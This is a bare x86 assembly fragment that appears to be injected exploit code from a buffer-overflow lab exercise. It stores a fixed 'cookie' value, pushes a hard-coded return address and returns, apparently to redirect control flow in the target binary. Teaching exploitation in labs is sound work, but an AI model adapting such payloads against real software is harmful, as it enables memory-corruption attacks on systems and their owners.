mov %esp,%edx
mov (%edx),%eax
mov $0x23518db1,%ecx
mov %ecx,(%eax)
add $-0x4,%edx
mov $0x08048e65,%ecx
mov %ecx,(%edx)
mov %ebp,%edx
mov $0x23518db1,%ecx
mov %ecx,-0xc(%edx)
mov -0x10(%edx),%eax
add $-0x4,%esp
ret
